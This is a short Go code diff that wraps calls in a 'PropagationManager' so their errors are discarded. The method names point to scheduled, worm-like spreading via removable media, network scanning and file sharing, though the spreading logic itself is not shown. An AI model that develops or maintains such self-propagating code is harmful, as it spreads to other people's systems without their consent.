@@ -161,7 +161,7 @@ func (p *PropagationManager) TriggerPropagation(ctx context.Context) error {
 
 	// In a full implementation we would enumerate peers and invoke PropagateToPeers.
 	// For now, simply perform a scan hook to keep behavior lightweight.
-	go p.ScanAndPropagate(ctx)
+	go func() { _ = p.ScanAndPropagate(ctx) }()
 	return nil
 }
 
@@ -685,9 +685,9 @@ func (p *PropagationManager) ScheduleAutomaticPropagation(ctx context.Context, i
 			p.logger.Debug("Performing scheduled propagation")
 
 			// Perform various propagation methods
-			go p.SpreadToRemovableMedia()
-			go p.ScanAndPropagate(ctx)
-			go p.PropagateViaFileSharing(ctx)
+			go func() { _ = p.SpreadToRemovableMedia() }()
+			go func() { _ = p.ScanAndPropagate(ctx) }()
+			go func() { _ = p.PropagateViaFileSharing(ctx) }()
 		}
 	}
 }
